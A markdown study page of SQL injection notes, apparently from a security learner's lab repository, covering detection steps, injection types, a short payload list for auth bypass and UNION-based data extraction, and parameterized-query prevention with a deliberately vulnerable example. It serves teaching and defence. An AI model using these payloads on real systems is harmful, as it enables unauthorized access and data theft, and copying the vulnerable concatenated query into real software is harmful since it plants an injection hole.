# 💉 SQL Injection — Notes & Labs

![Category](https://img.shields.io/badge/Category-SQL%20Injection-red?style=flat-square)
![Difficulty](https://img.shields.io/badge/Difficulty-Apprentice%20→%20Practitioner-orange?style=flat-square)

---

## 🧠 What is SQL Injection?

SQL Injection happens when user input is inserted directly into a SQL query without sanitization.
This lets an attacker manipulate the query logic — extracting data, bypassing authentication, or even destroying databases.

---

## 🔍 How to Detect It

**Step 1 — Inject a single quote:**
```
'
```
If the server throws an error → the input is being used raw in a SQL query.

**Step 2 — Test logic manipulation:**
```sql
' OR '1'='1
```
If the page behavior changes (more results, different content) → SQLi confirmed.

**Step 3 — Use Burp Repeater**
Intercept the request → send to Repeater → test different payloads without refreshing the browser.

---

## 📋 Types of SQLi

| Type | How it works |
|------|-------------|
| **Error-based** | Server shows SQL errors that leak info |
| **Union-based** | Append extra SELECT to extract data |
| **Blind (Boolean)** | No visible output — infer from true/false behavior |
| **Blind (Time-based)** | Use `SLEEP()` to infer data via response time |

---

## 💉 Payloads

```sql
-- Basic detection
'
''
`
')
"))

-- Auth bypass
' OR '1'='1
' OR 1=1--
admin'--
' OR 'x'='x

-- UNION (find number of columns first)
' ORDER BY 1--
' ORDER BY 2--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

-- Extract DB version
' UNION SELECT @@version--          -- MySQL/MSSQL
' UNION SELECT version()--          -- PostgreSQL
```

---

## ✅ Key Takeaways

- Always test with `'` first — it's the simplest signal
- Error messages are gold — they tell you the DB type
- Burp Repeater is essential for testing payloads efficiently
- The difference between Error-based and Blind SQLi changes your entire approach
- Never test on real systems without permission

---

## 🛡️ How to Prevent SQLi

```python
# ❌ Vulnerable
query = "SELECT * FROM users WHERE username = '" + username + "'"

# ✅ Secure — Parameterized Query
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))
```

| Fix | Description |
|-----|-------------|
| Parameterized Queries | Never concatenate user input into SQL |
| Input Validation | Whitelist allowed characters |
| Least Privilege | DB user shouldn't have DROP/DELETE access |
| WAF | Web Application Firewall as extra layer |
